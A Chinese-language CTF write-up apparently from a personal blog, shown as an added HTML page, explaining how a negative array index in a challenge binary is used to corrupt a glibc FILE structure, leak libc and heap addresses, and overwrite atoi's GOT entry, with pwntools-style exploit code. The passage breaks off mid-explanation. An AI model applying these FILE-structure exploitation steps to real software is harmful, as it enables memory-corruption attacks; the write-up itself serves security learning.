@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，检查一下程序的保护机制，发现PIE和RELRO没有开启，或许我们可以很方便的修改GOT表   然后，我们用IDA分析一下，发现wizard_spell函数存在**[数组下标向负数越界的漏洞]{.mark}**   然后是create函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="magic">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/10/magic/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，检查一下程序的保护机制，发现PIE和RELRO没有开启，或许我们可以很方便的修改GOT表   然后，我们用IDA分析一下，发现wizard_spell函数存在**[数组下标向负数越界的漏洞]{.mark}**   然后是create函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image11.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image12.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image13.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/10/magic/image14.JPG">
+<meta property="article:published_time" content="2019-11-10T07:10:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T10:51:24.973Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="下标越界">
+<meta property="article:tag" content="IO FILE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/10/magic/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/10/magic/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>magic | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/10/magic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          magic
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-10 15:10:50" itemprop="dateCreated datePublished" datetime="2019-11-10T15:10:50+08:00">2019-11-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 18:51:24" itemprop="dateModified" datetime="2025-06-21T18:51:24+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，检查一下程序的保护机制，发现PIE和RELRO没有开启，或许我们可以很方便的修改GOT表</p>
+<img src="/ha1vk/2019/11/10/magic/image1.JPG" class="">
+
+<p>然后，我们用IDA分析一下，发现wizard_spell函数存在**[数组下标向负数越界的漏洞]{.mark}**</p>
+<img src="/ha1vk/2019/11/10/magic/image2.JPG" class="">
+
+<p>然后是create函数</p>
+<img src="/ha1vk/2019/11/10/magic/image3.JPG" class="">
+
+<p>然后，我们用IDA调试一下，发现wizards[-2]处就是log_file的地址，而这句可以修改FILE结构体的第40字节处的数据。</p>
+<img src="/ha1vk/2019/11/10/magic/image4.JPG" class="">
+
+<p>让我们先来看看log_file的结构体内容</p>
+<img src="/ha1vk/2019/11/10/magic/image5.JPG" class="">
+
+<p>偏移40字节处是_IO_write_ptr，而_IO_write_ptr是缓冲区的地址，下一次写数据时,<strong>如果_IO_write_ptr与_IO_write_end不相等，那么就会往_IO_write_ptr指向的区域写数据</strong>，而程序正好能够修改这里的内容，那么，我们把它修改，让它指向log_file结构体本身，那么我们就能修改整个log_file结构体，修改_IO_read_ptr和_IO_read_end，这样read时，就能泄露地址信息，然后将_IO_write_ptr指向目标地址，写目标地址，比如修改got表。</p>
+<p>显然，当前_IO_write_ptr为0，缓冲区还未初始化，因此，我们需要先调用create来初始化一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这两步是为了初始化FILE的结构体  </span></span><br><span class="line">create()  </span><br><span class="line">WizardSpell(<span class="number">0</span>,<span class="string">&#x27;seaase&#x27;</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>然后，我们再看一下结构体中的内容</p>
+<img src="/ha1vk/2019/11/10/magic/image6.JPG" class="">
+
+<p>我们看到，缓冲区已经初始化了，现在我们就要开始攻击了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改log_file结构体的_IO_write_ptr  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):  </span><br><span class="line">   <span class="comment">#_IO_write_ptr = _IO_write_ptr + 1 - 50  </span></span><br><span class="line">   WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#在不影响log_file结构体的情况下，我们抬升_IO_write_ptr 13个字节，然后再-=50  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">13</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):  </span><br><span class="line">   <span class="comment">#_IO_write_ptr = _IO_write_ptr + 1 - 50  </span></span><br><span class="line">   WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#在不影响log_file结构体的情况下，我们抬升_IO_write_ptr 9个字节，然后再-=50  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">9</span>)  </span><br><span class="line">WizardSpell(-<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>在修改时，要注意不要破坏其他地方的数据，因此，上述的各个内容，都是在调试后确定的。比如，我们每调用一次WizardSpell(-2,’x00’)，_IO_write_ptr &#x3D; _IO_write_ptr + 1 – 50，而WizardSpell(-2,’x00’*13)，_IO_write_ptr &#x3D; _IO_write_ptr + 13 – 50也就是说，<strong>内容的长度可以抬高_IO_write_ptr</strong></p>
+<p><strong>Glibc中的源码是这样的</strong></p>
+<img src="/ha1vk/2019/11/10/magic/image7.JPG" class="">
+
+<p>经过上面的操作，现在_IO_write_ptr就指向了log_file的结构体附近处，我们就可以改写log_file的结构体了。为了泄露地址信息，我们需要<strong>改写_IO_read_ptr 和_IO_read_end</strong>，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#现在，_IO_write_base指向了log_file的结构体附近处，我们可以修改log_file的结构体了  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0x231</span>)  </span><br><span class="line"><span class="comment">#flags  </span></span><br><span class="line">payload += p64(<span class="number">0xFBAD24A8</span>)  </span><br><span class="line">WizardSpell(<span class="number">0</span>,payload)  </span><br><span class="line"><span class="comment">#_IO_read_ptr  _IO_read_end  </span></span><br><span class="line">payload = p64(atoi_got) + p64(atoi_got+<span class="number">0x100</span>)  </span><br><span class="line">WizardSpell(<span class="number">0</span>,payload)  </span><br><span class="line">atoi_addr = u64(sh.recv(<span class="number">8</span>))  </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(atoi_addr)  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)  </span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>请注意红色部分，我们用的是<strong>WizardSpell(0,payload)<strong>而不是WizardSpell(-2,payload)，这是因为WizardSpell(-2,payload)会使得_IO_write_ptr – 50，这样，_IO_write_ptr就会指向上面的不可写的段，使得我们不能第二次利用。而</strong>WizardSpell(0,payload)</strong> 只会把_IO_write_ptr+&#x3D; len(payload)，而不会让_IO_write_ptr再减去50.因为被减50的是结构体0对应的第40个字节处的数据。</p>
+<img src="/ha1vk/2019/11/10/magic/image8.JPG" class="">
+
+<p>现在，我们得到了需要的地址信息，我们要开始攻击atoi的GOT表了，我们想把_IO_write_ptr指向atoi的GOT表，于是，我们尝试这样修改结构体</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(atoi_got) * <span class="number">3</span> + p64(atoi_got + <span class="number">8</span>)  </span><br><span class="line">WizardSpell(<span class="number">0</span>,payload)  </span><br></pre></td></tr></table></figure>
+
+<p>然后，我们看看结FILE构体的内容</p>
+<img src="/ha1vk/2019/11/10/magic/image9.JPG" class="">
+
+<p>发现，除了**[_IO_write_ptr没有成功修改，其他都改了。这是怎么回事？]{.mark}**</p>
+<p>我们用IDA跟踪fwrite函数，发现程序最终会调用_IO_new_file_xsputn函数，然后，我们跟进_IO_new_file_xsputn函数，发现，这一句代码改变了_IO_write_ptr的值</p>
+<img src="/ha1vk/2019/11/10/magic/image10.JPG" class="">
+
+<p>对应的汇编代码</p>
+<img src="/ha1vk/2019/11/10/magic/image11.JPG" class="">
+
+<p>然后，我们去看看libc的源码，对照一下，发现</p>
+<img src="/ha1vk/2019/11/10/magic/image12.JPG" class="">
+
+<p>经过调试，发现图中的loc_7FA3926C73B0就是__memcpy，它返回值<strong>rax为复制后的结尾指针</strong>，比如，p&#x3D;xxx，那么__memcpy(p,s,count)就是返回的p + count，因此, _IO_write_ptr再一次被覆盖，变回了原来的正常情况地址。</p>
+<p><strong>[由此，我们不能通过fwrite来对_IO_write_ptr做修改，我们应该借助fread来修_IO_write_ptr。我总结了一下，如果是read操作，我们可以修改write相关的指针，如果是write操作，我们可以修改read相关指针。]{.mark}</strong></p>
+<p>由于程序在fwrite后接着就调用fread，所以，我们**[利用fread来修改_IO_write_ptr]{.mark}**</p>
+<img src="/ha1vk/2019/11/10/magic/image13.JPG" class="">
+
+<p>我们还是来分析一下fread的源码，经过跟踪，发现fread最终会调用**_IO_new_file_underflow**函数，然后，我们分析一下_IO_new_file_underflow函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>  </span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)  </span><br><span class="line">&#123;  </span><br><span class="line">  _IO_ssize_t count;  </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0  </span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span>  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)  </span><br><span class="line">    <span class="keyword">return</span> (EOF);  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)  </span><br><span class="line">    &#123;  </span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;  </span><br><span class="line">      __set_errno (EBADF);  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span>  </span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);  </span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;  </span><br><span class="line">    &#125;  </span><br><span class="line">      _IO_doallocbuf (fp);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span>  </span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span>  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))  </span><br><span class="line">    &#123;  </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0  </span></span><br><span class="line">      _IO_flush_all_linebuffered ();  </span><br><span class="line"><span class="meta">#<span class="keyword">else</span>  </span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t </span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that </span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better </span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here </span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span>  </span><br><span class="line">      _IO_acquire_lock (_IO_stdout);  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))  </span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))  </span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);  </span><br><span class="line">  </span><br><span class="line">      _IO_release_lock (_IO_stdout);  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  _IO_switch_to_get_mode (fp);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those </span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since </span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for </span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span>  </span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;  </span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  </span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end  </span><br><span class="line">    = fp-&gt;_IO_buf_base;  </span><br><span class="line">  </span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  </span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);  </span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)  </span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;  </span><br><span class="line">      <span class="keyword">else</span>  </span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">  fp-&gt;_IO_read_end += count;  </span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active </span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so </span></span><br><span class="line"><span class="comment">     unset it.  */</span>  </span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;  </span><br><span class="line">      <span class="keyword">return</span> EOF;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)  </span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);  </span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>首先，上面17、18行我们看到，如果fp-&gt;_IO_read_ptr小于fp-&gt;_IO_read_end，就会直接返回，因此，我们<strong>在fwrite时，应该伪造fp-&gt;_IO_read_ptr和fp-&gt;_IO_read_end</strong>，使得条件不满足，继续向下执行，就会来到<strong>59、60、61行，这里有对fp-&gt;_IO_write_ptr赋值，并且其值为_IO_buf_base，因此，[在fwrite时，还应该伪造_IO_buf_base为我们攻击的目标地址。]{.mark}</strong></p>
+<p>为了能覆盖到_IO_buf_base,首先，我们需要保证_IO_write_ptr小于_IO_write_end，因此，我们，因此，我们让_IO_write_end比_IO_write_ptr大一些，至于大多少，反正要保证_IO_buf_base的地址坐落在[_IO_write_ptr, _IO_write_end]，因此，我们随便选一个，我这里选的是0x100。当然，我们需要知道_IO_write_ptr的值，由此，我们还需要泄露FILE结构体本身的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#回到之前的位置  </span></span><br><span class="line">WizardSpell(-<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0</span>))  </span><br><span class="line"><span class="comment">#重新写  </span></span><br><span class="line">WizardSpell(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0x231</span>) + p64(<span class="number">0xfbad24a8</span>))  </span><br><span class="line"><span class="comment">#当执行fread后，要求_IO_read_ptr大于等于_IO_read_end，经过调试，发现输出以后，发现0x50正好  </span></span><br><span class="line">WizardSpell(<span class="number">0</span>, p64(log_addr) + p64(log_addr + <span class="number">0x50</span>) + p64(log_addr))  </span><br><span class="line"><span class="comment">#泄露log_file结构体的地址  </span></span><br><span class="line">heap_addr = u64(sh.recvn(<span class="number">8</span>)) - <span class="number">0x10</span>  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap addr:&#x27;</span>,<span class="built_in">hex</span>(heap_addr)  </span><br></pre></td></tr></table></figure>
+
+<p>注意，上面，我们<strong>WizardSpell(-2, p64(0) + p64(0))<strong>而不是WizardSpell(0, p64(0) + p64(0))，这是因为，用-2，使得_IO_write_ptr重新回到前面，这样，我们又可以覆盖_IO_read_ptr和_IO_read_end，并且，</strong>[我们设置_IO_read_ptr &#x3D; log_addr , _IO_read_end &#x3D; log_addr + 0x50，这个0x50可以不用精确，只需要保证，经过二轮fread后，_IO_read_ptr大于等于_IO_read_end，这样，第三轮fread时，就可以修改_IO_write_ptr。]{.mark}</strong></p>
+<p>第一轮，我们覆盖了_IO_read_ptr和_IO_read_end，用于泄露结构体本身的地址</p>
+<p>第二轮，我们要修改_IO_write_end</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改_IO_write_end  </span></span><br><span class="line">WizardSpell(<span class="number">0</span>,p64(heap_addr + <span class="number">0x100</span>)*<span class="number">3</span>)  </span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">第三轮，现在_IO_read_ptr大于等于_IO_read_end，并且_IO_write_ptr指向了_IO_buf_base，那么，我们覆盖_IO_buf_base和_IO_buf_end</span><br><span class="line"></span><br><span class="line">```Python</span><br><span class="line"><span class="comment">#覆盖_IO_buf_base和_IO_buf_end  </span></span><br><span class="line"><span class="comment">#然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base  </span></span><br><span class="line">WizardSpell(<span class="number">0</span>,p64(atoi_got+<span class="number">0x78</span> + <span class="number">23</span>) + p64(atoi_got + <span class="number">0xA00</span>)) </span><br></pre></td></tr></table></figure>
+
+<p>这里，我们不直接覆盖为atoi_got，而是向下偏移一些，是因为fread时</p>
+<img src="/ha1vk/2019/11/10/magic/image14.JPG" class="">
+
